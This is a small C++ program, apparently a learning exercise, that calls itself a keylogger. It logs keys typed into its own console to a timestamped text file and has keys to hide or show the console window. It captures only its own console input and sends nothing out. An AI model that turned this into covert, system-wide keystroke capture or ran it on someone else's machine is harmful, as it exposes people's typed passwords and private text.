#include "pch.h"

HANDLE hInput = GetStdHandle(STD_INPUT_HANDLE);
INPUT_RECORD ir;
DWORD count_events;
bool Running = true;

void HideConsole() { ShowWindow(GetConsoleWindow(), SW_HIDE); }

void ShowConsole() { ShowWindow(GetConsoleWindow(), SW_SHOW); }

auto GetKeyEvent() { return ir.Event.KeyEvent; }

char GetKey() {
  const char key = static_cast<char>(MapVirtualKeyA(GetKeyEvent().wVirtualKeyCode, 2));
  return key;
}

void ReadInput(std::ofstream &file) { 
  ReadConsoleInput(hInput, &ir, sizeof ir, &count_events);

  if (GetKeyEvent().bKeyDown && GetKeyEvent().wVirtualKeyCode == 83) { ShowConsole(); }

  if (GetKeyEvent().bKeyDown && GetKeyEvent().wVirtualKeyCode == 72) { HideConsole(); }

  if (GetKeyEvent().bKeyDown && GetKeyEvent().wVirtualKeyCode == 27) {
    ShowConsole();
    file.close();
    Running = false;
  }

  if (GetKeyEvent().bKeyDown) {
    auto time = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
    file << GetKey() << " was pressed at: " << std::ctime(&time);
    std::cout << GetKey() << " was pressed at: " << std::ctime(&time);
  }
}

int main() {
  std::ofstream file("log.txt", std::ios::out);
  std::cout << "Press H to hide the console\nPress S to show console\nPress ESC to stop keylogger\n";
  
  while (Running) {
    ReadInput(file);
  }
  file.close();
  return 0;
}
